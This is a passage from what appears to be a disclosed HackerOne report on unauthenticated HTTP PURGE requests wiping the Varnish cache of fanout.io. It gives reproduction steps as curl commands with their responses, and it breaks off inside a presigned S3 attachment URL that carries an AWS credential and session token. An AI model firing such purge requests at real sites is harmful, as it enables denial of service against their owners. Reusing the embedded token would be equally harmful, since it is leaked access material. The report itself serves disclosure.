"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\nAnyone can issue a PURGE request for any resource and invalidate your caches. That can lead to increased bandwidth costs but also potential Denial of Service attacks.\n\n## Steps To Reproduce:\n\n  1. Fetching the resource headers, we can see in the X-Cache that the resource was a HIT with X-Cache-Hits: 5:\nPut the below command in the terminal (this is request):\n# curl -s -D - https://fanout.io -o /dev/null\nHTTP/2 200\nserver: nginx/1.14.0 (Ubuntu)\ncontent-type: text/html; charset=utf-8\nx-frame-options: DENY\nx-content-type-options: nosniff\naccept-ranges: bytes\ndate: Wed, 12 Apr 2023 00:05:08 GMT\nvia: 1.1 varnish\nage: 1215\nx-served-by: cache-maa10224-MAA\nx-cache: HIT\nx-cache-hits: 5\nx-timer: S1681257908.308066,VS0,VE0\nvary: Cookie\ncontent-length: 20567\n\n  2. Then put the below command to purge the cache as an unauthenticated user. And see the result, Status is OK means it successfully deletes the cache without authentication.\n# curl -X PURGE https://fanout.io\n{ \"status\": \"ok\", \"id\": \"10234-1680248948-114138\" }\n\n  3. Now again fire the first command to see the x-cache-hits. See, the x-cache-hits is 1 now.\n# curl -s -D - https://fanout.io -o /dev/null\nHTTP/2 200\nserver: nginx/1.14.0 (Ubuntu)\ncontent-type: text/html; charset=utf-8\nx-frame-options: DENY\nx-content-type-options: nosniff\naccept-ranges: bytes\ndate: Wed, 12 Apr 2023 00:06:01 GMT\nvia: 1.1 varnish\nage: 8\nx-served-by: cache-maa10233-MAA\nx-cache: HIT\nx-cache-hits: 1\nx-timer: S1681257962.998849,VS0,VE1\nvary: Cookie\ncontent-length: 20567\n\n\n## Supporting Material/References:\nHere is attached screenshots.\n\n 1. {F2287583}\n2. {F2287584}\n3. {F2287585}\n\n Also I am putting a reference report link here.\nhttps://hackerone.com/reports/154278\n\n## Impact\n\nThis can lead to increased bandwidth costs and degraded application performance. Allowing anonymous users to purge cache could be used to maliciously degrade performance.","weakness":{"id":26,"name":"Improper Access Control - Generic"},"original_report_id":1836212,"original_report_url":"https://hackerone.com/reports/1836212","attachments":[{"id":2287582,"file_name":"cache_purge-1.JPG","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/0bocc31v9hbycb02q6arsiic3uc8?response-content-disposition=attachment%3B%20filename%3D%22cache_purge-1.JPG%22%3B%20filename%2A%3DUTF-8%27%27cache_purge-1.JPG\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQUW7MGYKT%2F20260429%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20260429T073831Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjECcaCXVzLXdlc3QtMiJGMEQCIAioFGy4lCSgU0%2BwPyu9SjXAgXDdu%2BCveOyQU%2B82aYRYAiAgk0NKxO6aloMpGkkiXO4iDz1HiMC3t5Zw06179G8C4iq7BQjw%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMdwmflO9DbCB76gWcKo8Ftt7uDuDudrsX%2FA3WRoXLNZp4rbFg0ce6g9aq6CB63F2iJRG9VYhm81BMx8S4vfbaT11KPjdMHoIQZ9RX%2FNR8Cr1fVA2RcL7mx2NawRQ76y3WSM51BO2b9ix8jArxQQvPoPCvvazdktxrfhc%2F8WVrwxZ%2BXhargNjFAR0nX0f%2F1VlNXZBBVCi4uOhs%2B4ia%2F09e6eY0iMYBrgzhZDeay0SFaGyB%2FOVeQGAAl2j0yF%2BnxaE%2FhLV%2FQxdgrvbHMeS615VufYX1CIJn%2BPBNYEJVbdHF8CZsBrdYLSNeKln5l%2FplfsPcw44huyuP5LRiB2cs%2BnagV0VcXVURBkUbUztiPBNMe5sl42lwVKAPMqqkK3ClabijODAw1tdzo%2BBXpKh8dozOmrzBXqEbejfhsGAmsR40piKNSOqQVx%2F%2BvZ2L9pfkBwAUOS9xmHURjSz62Q7rCtE%2F25YaqqnrxO3eqaFo07SJnFnK6ED4UbWso1%2FUt%2FBvJzVfG8H8Ca6NLcWAwnrQiZ0k3l7DZwanFlUWLf276FN%2BoclXv%2F4umooXdI5eZoFvpGumcev2fxN8DX%2FsMa5q9wc515I3T5E%2FmM%2Fp61pqg2iJ8kXLn3F%2B1ZGdQQt8f%2FiqC4Yeu7zD8AejeXdwtEgmmJpESW86MxNHFNPBXIEBIFfaxrmgHVW2vng6pMjiT7XHz3FsctWeLe%2FWkZ8spyhYhqunXesAVB6dFvKi%2BtLJtwv4rZy24itxqPVvOSu0eQRk7BlixaWU1TNf45R6oKfKfQm9MmHxykShiYtoJt2c0FqNJZ%2FLN9dXI2Pdjb776FS7wIv3xmtTU9huk6ZH5UinfybDqtWywsCQ65xzrwI3f5i9ZTBUJkC%2F2zTMEw%2BGccaqRTCK4MbPBjqyARrw9RPg0y0%2BL01uvNj%2Bocmv3hW4mjec50i8hpiIE9QUIMA7h6cSkxJ58uJKNn7QN2W5atlT